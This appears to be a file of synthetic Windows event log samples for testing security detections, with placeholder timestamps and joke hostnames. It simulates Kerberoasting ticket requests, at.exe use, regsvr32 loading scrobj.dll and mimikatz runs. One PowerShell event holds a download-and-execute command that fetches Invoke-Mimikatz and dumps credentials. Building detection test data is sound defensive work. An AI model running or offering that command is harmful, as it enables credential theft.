message
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}' /><EventID>4769</EventID><Version>0</Version><Level>Information</Level><Task>Kerberos Service Ticket Operations</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='{currentTime}' /><EventRecordID>166746</EventRecordID><Correlation /><Execution ProcessID='520' ThreadID='1496' /><Channel>Security</Channel><Computer>DC01.logrhythm.com</Computer><Security /></System><EventData><Data Name='TargetUserName'>heather.deathknell</Data><Data Name='TargetDomainName'>LOGRHYTHM</Data><Data Name='ServiceName'>server1$</Data><Data Name='ServiceSid'>S-1-5-21-3457937927-2839227994-823803824-2102</Data><Data Name='TicketOptions'>0x40810000</Data><Data Name='TicketEncryptionType'>0x17</Data><Data Name='IpAddress'>::ffff:10.1.1.2</Data><Data Name='IpPort'>49272</Data><Data Name='Status'>0x0</Data><Data Name='LogonGuid'>{F85C455E-C66E-205C-6B39-F6C60A7FE453}</Data><Data Name='TransmittedServices'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='{currentTime}'/><EventRecordID>337650</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='9740'/><Channel>Security</Channel><Computer>poolside-laptop</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-1760952874-2610146993-1928205901-13172</Data><Data Name='SubjectUserName'>brandon.pace</Data><Data Name='SubjectDomainName'>SECIOUS</Data><Data Name='SubjectLogonId'>0x2acd4485</Data><Data Name='NewProcessId'>0x948</Data><Data Name='NewProcessName'>C:\Windows\System32\at.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x2ef8</Data><Data Name='CommandLine'>at</Data><Data Name='TargetUserSid'>S-1-0-0</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>S-1-16-12288</Data></EventData></Event>
"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>7</EventID><Version>3</Version><Level>Information</Level><Task>Image loaded (rule: ImageLoad)</Task><Opcode>Info</Opcode><Keywords></Keywords><TimeCreated SystemTime='{currentTime}'/><EventRecordID>5128728</EventRecordID><Correlation/><Execution ProcessID='1980' ThreadID='4980'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Nightmare On Hacker Street</Computer><Security UserID='NT AUTHORITY\SYSTEM'/></System><EventData><Data Name='RuleName'></Data><Data Name='UtcTime'>2019-04-19 02:38:16.553</Data><Data Name='ProcessGuid'>{9836bb5c-3498-5cb9-0000-0010108e8559}</Data><Data Name='ProcessId'>2976</Data><Data Name='Image'>C:\Windows\System32\regsvr32.exe</Data><Data Name='ImageLoaded'>C:\Windows\System32\scrobj.dll</Data><Data Name='FileVersion'>5.8.9600.16384</Data><Data Name='Description'>Windows ® Script Component Runtime</Data><Data Name='Product'>Microsoft ® Windows ® Script Component Runtime</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='Hashes'>MD5=9304C7A3D7B5CF0CCC4C3ECCA219D89F,SHA256=2F426E84411DAA85C296F9E0DB5984BF5AC9BC5791643DF0981CD61141132A5B</Data><Data Name='Signed'>true</Data><Data Name='Signature'>Microsoft Windows</Data><Data Name='SignatureStatus'>Valid</Data></EventData></Event>"
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='PowerShell'/><EventID Qualifiers='0'>600</EventID><Level>Information</Level><Task>Provider Lifecycle</Task><Keywords>Classic</Keywords><TimeCreated SystemTime='{currentTime}'/><EventRecordID>10481925</EventRecordID><Channel>Windows PowerShell</Channel><Computer>1428 Elm St.</Computer><Security/></System><EventData>Provider Registry is Started. Details: ProviderName=Registry NewProviderState=Started SequenceNumber=1 HostName=ConsoleHost HostVersion=5.0.10586.117 HostId=63dafbfc-fdf4-468d-ab1d-3f0eb2d85bb1 HostApplication=powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds EngineVersion= RunspaceId= PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=</EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4769</EventID><Version>0</Version><Level>Information</Level><Task>Kerberos Service Ticket Operations</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2020-01-20T18:17:35.612880600Z'/><EventRecordID>10050658198</EventRecordID><Correlation/><Execution ProcessID='488' ThreadID='2096'/><Channel>Security</Channel><Computer>crystal.freakin.wiecken</Computer><Security/></System><EventData><Data Name='TargetUserName'>crystal.freakin.wiecken</Data><Data Name='TargetDomainName'>LAB.LOCAL</Data><Data Name='ServiceName'>SQLSvcAcct</Data><Data Name='ServiceSid'>LAB\SQLSvcAcct</Data><Data Name='TicketOptions'>0x40810000</Data><Data Name='TicketEncryptionType'>0x17</Data><Data Name='IpAddress'>::ffff:172.16.168.102</Data><Data Name='IpPort'>54866</Data><Data Name='Status'>0x0</Data><Data Name='LogonGuid'>{bc235f5e-eb03-83c9-95be-81555aa4860c}</Data><Data Name='TransmittedServices'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-a5ba-3e3b0328c30d}'/><EventID>4688</EventID><Version>2</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime='{currentTime}'/><EventRecordID>337650</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='9740'/><Channel>Security</Channel><Computer>Security Conscious</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>S-1-5-21-1760952874-2610146993-1928205901-13172</Data><Data Name='SubjectUserName'>phil.villilain</Data><Data Name='SubjectDomainName'>SECIOUS</Data><Data Name='SubjectLogonId'>0x2acd4485</Data><Data Name='NewProcessId'>0x948</Data><Data Name='NewProcessName'>C:\Windows\System32\at.exe</Data><Data Name='TokenElevationType'>%%1936</Data><Data Name='ProcessId'>0x2ef8</Data><Data Name='CommandLine'>at</Data><Data Name='TargetUserSid'>S-1-0-0</Data><Data Name='TargetUserName'>-</Data><Data Name='TargetDomainName'>-</Data><Data Name='TargetLogonId'>0x0</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><Data Name='MandatoryLabel'>S-1-16-12288</Data></EventData></Event>
<Event xmlns='http:////schemas.microsoft.com//win//2004//08//events//event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'//><EventID>4688<//EventID><Version>2<//Version><Level>Information<//Level><Task>Process Creation<//Task><Opcode>Info<//Opcode><Keywords>Audit Success<//Keywords><TimeCreated SystemTime='{currentTime}'//><EventRecordID>11089669<//EventRecordID><Correlation//><Execution ProcessID='4' ThreadID='4788'//><Channel>Security<//Channel><Computer>win10<//Computer><Security//><//System><EventData><Data Name='SubjectUserSid'>NT AUTHORITY-SYSTEM<//Data><Data Name='SubjectUserName'>vaughn.adams<//Data><Data Name='SubjectDomainName'>WORKGROUP<//Data><Data Name='SubjectLogonId'>0x3e7<//Data><Data Name='NewProcessId'>0x21d4<//Data><Data Name='NewProcessName'>C:\Users\vaughn.adams\Sourcery\mimikatz_trunk (1)\x64\mimikatz.exe<//Data><Data Name='TokenElevationType'>%%1937<//Data><Data Name='ProcessId'>0x1424<//Data><Data Name='CommandLine'>'C:\Users\vaughn.adams\Sourcery\mimikatz_trunk (1)\x64\mimikatz.exe' <//Data><Data Name='TargetUserSid'>vaughn.adams<//Data><Data Name='TargetUserName'>vaughn.adams<//Data><Data Name='TargetDomainName'>vaughn.adams<//Data><Data Name='TargetLogonId'>0x28c34<//Data><Data Name='ParentProcessName'>C:\Windows\explorer.exe<//Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level<//Data><//EventData><//Event>
<Event xmlns='http:/schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>Information</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='{currentTime}'/><EventRecordID>11089669</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='4788'/><Channel>Security</Channel><Computer>lurch</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>NT AUTHORITY-SYSTEM</Data><Data Name='SubjectUserName'>vaughn.adams</Data><Data Name='SubjectDomainName'>WORKGROUP</Data><Data Name='SubjectLogonId'>0x3e7</Data><Data Name='NewProcessId'>0x21d4</Data><Data Name='NewProcessName'>C:\Users\vaughn.adams\Sourcery\mimikatz_trunk (1)\x64\mimikatz.exe</Data><Data Name='TokenElevationType'>%%1937</Data><Data Name='ProcessId'>0x1424</Data><Data Name='CommandLine'>'C:\Users\vaughn.adams\Sourcery\mimikatz_trunk (1)\x64\mimikatz.exe' </Data><Data Name='TargetUserSid'>vaughn.adams</Data><Data Name='TargetUserName'>vaughn.adams</Data><Data Name='TargetDomainName'>lurch</Data><Data Name='TargetLogonId'>0x28c34</Data><Data Name='ParentProcessName'>C:\Windows\explorer.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http:/schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>Information</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='{currentTime}'/><EventRecordID>11089669</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='4788'/><Channel>Security</Channel><Computer>lurch</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>NT AUTHORITY-SYSTEM</Data><Data Name='SubjectUserName'>steve.kansket</Data><Data Name='SubjectDomainName'>WORKGROUP</Data><Data Name='SubjectLogonId'>0x3e7</Data><Data Name='NewProcessId'>0x21d4</Data><Data Name='NewProcessName'>C:\Users\steve.kansket\Sourcery\mimikatz_trunk (1)\x64\mimikatz.exe</Data><Data Name='TokenElevationType'>%%1937</Data><Data Name='ProcessId'>0x1424</Data><Data Name='CommandLine'>'C:\Users\steve.kansket\Sourcery\mimikatz_trunk (1)\x64\mimikatz.exe' </Data><Data Name='TargetUserSid'>steve.kansket</Data><Data Name='TargetUserName'>steve.kansket</Data><Data Name='TargetDomainName'>lurch</Data><Data Name='TargetLogonId'>0x28c34</Data><Data Name='ParentProcessName'>C:\Windows\explorer.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
<Event xmlns='http:/schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{54849625-5478-4994-A5BA-3E3B0328C30D}'/><EventID>4688</EventID><Version>2</Version><Level>Information</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='{currentTime}'/><EventRecordID>11089669</EventRecordID><Correlation/><Execution ProcessID='4' ThreadID='4788'/><Channel>Security</Channel><Computer>lurch</Computer><Security/></System><EventData><Data Name='SubjectUserSid'>NT AUTHORITY-SYSTEM</Data><Data Name='SubjectUserName'>jordie.adams</Data><Data Name='SubjectDomainName'>WORKGROUP</Data><Data Name='SubjectLogonId'>0x3e7</Data><Data Name='NewProcessId'>0x21d4</Data><Data Name='NewProcessName'>C:\Users\jordie.adams\Sourcery\mimikatz_trunk (1)\x64\mimikatz.exe</Data><Data Name='TokenElevationType'>%%1937</Data><Data Name='ProcessId'>0x1424</Data><Data Name='CommandLine'>'C:\Users\jordie.adams\Sourcery\mimikatz_trunk (1)\x64\mimikatz.exe' </Data><Data Name='TargetUserSid'>jordie.adams</Data><Data Name='TargetUserName'>jordie.adams</Data><Data Name='TargetDomainName'>lurch</Data><Data Name='TargetLogonId'>0x28c34</Data><Data Name='ParentProcessName'>C:\Windows\explorer.exe</Data><Data Name='MandatoryLabel'>Mandatory Label\High Mandatory Level</Data></EventData></Event>
